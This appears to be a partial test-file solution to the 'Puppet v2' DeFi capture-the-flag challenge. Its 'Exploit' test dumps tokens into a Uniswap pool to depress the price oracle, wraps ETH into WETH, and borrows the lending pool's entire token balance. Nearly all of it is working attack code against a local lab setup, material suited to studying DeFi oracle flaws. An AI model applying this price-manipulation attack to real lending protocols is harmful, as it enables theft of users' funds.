...
describe("[Challenge] Puppet v2", function () {
    ...
    it("Exploit", async function () {
        ...
        const uniswapAttacker = await this.uniswapRouter.connect(attacker)
        const poolAttacker = await this.lendingPool.connect(attacker)
        const tokenAttacker = await this.token.connect(attacker)
        const wethAttacker = await this.weth.connect(attacker)

        await tokenAttacker.approve(
            this.uniswapRouter.address,
            ethers.utils.parseEther("100000")
        )

        await uniswapAttacker.swapExactTokensForETH(
        ...
        await wethAttacker.deposit({ value: ethers.utils.parseEther("29.5") })
        await wethAttacker.approve(
            this.lendingPool.address,
            ethers.utils.parseEther("29.5")
        )

        await poolAttacker.borrow(POOL_INITIAL_TOKEN_BALANCE)
    })
